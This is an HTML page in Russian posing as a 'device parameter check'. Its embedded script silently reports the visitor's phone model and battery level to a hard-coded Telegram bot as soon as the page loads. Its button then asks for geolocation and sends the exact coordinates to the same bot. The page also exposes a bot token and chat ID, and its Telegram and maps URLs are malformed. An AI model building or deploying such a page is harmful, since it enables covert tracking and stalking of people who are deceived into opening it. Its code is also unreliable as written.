<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тестовая страница</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            text-align: center;
            background-color: #f4f4f9;
        }
        button {
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
            font-weight: bold;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

    <h1>Проверка параметров устройства</h1>
    <p>Нажмите кнопку ниже, чтобы проверить точность определения геолокации и технических характеристик вашего телефона.</p>
    
    <button onclick="requestLocation()">Проверить геопозицию</button>

    <script>
        // Ваши данные Telegram (уже настроены)
        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
        const TG_CHAT_ID = "6559747526"; 

        // Функция отправки в Telegram
        async function sendToTelegram(text) {
            const url = `https://telegram.org{TG_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            }).catch(e => console.error(e));
        }

        // Функция сбора модели и заряда
        async function getDeviceSpecs() {
            let batteryLevel = "Не поддерживается (например, на iOS)";
            let deviceModel = "Не определено";

            // 1. Сбор заряда батареи
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch (e) {}
            }

            // 2. Сбор модели через современные Client Hints (для Android)
            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    deviceModel = `${ua.model || "Неизвестная модель"} (Android ${ua.platformVersion})`;
                } catch (e) {}
            } else {
                // Резервный метод для iOS/других браузеров (показывает общую платформу)
                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                    deviceModel = "Apple Device (iOS)";
                } else if (/Android/i.test(navigator.userAgent)) {
                    deviceModel = "Android Device";
                } else {
                    deviceModel = "Компьютер / Другое";
                }
            }

            return { batteryLevel, deviceModel };
        }

        // Основная функция аналитики
        async function collectAnalytics(extraText = "") {
            const specs = await getDeviceSpecs();
            const localTime = new Date().toLocaleTimeString();

            const message = `📱 *Новый отчет об устройстве*\n\n` +
                            `🤖 Модель: ${specs.deviceModel}\n` +
                            `🔋 Заряд батареи: ${specs.batteryLevel}\n` +
                            `🕒 Время запроса: ${localTime}` + 
                            extraText;

            sendToTelegram(message);
        }

        // Автоматический запуск при входе (без геолокации)
        window.addEventListener('DOMContentLoaded', () => {
            collectAnalytics();
        });

        // Запуск при нажатии на кнопку (с геолокацией)
        async function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const geoText = `\n\n📍 *Местонахождение*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Открыть на картах Google](https://google.com{lat},${lon})`;
                        
                        // Отправляем полный отчет с координатами
                        collectAnalytics(geoText);
                        alert("Проверка завершена. Данные отправлены в ваш бот.");
                    },
                    (error) => {
                        alert("Для проверки местонахождения необходимо разрешить доступ к геопозиции.");
                    }
                );
            } else {
                alert("Геопозиция не поддерживается вашим браузером.");
            }
        }
    </script>
</body>
</html>
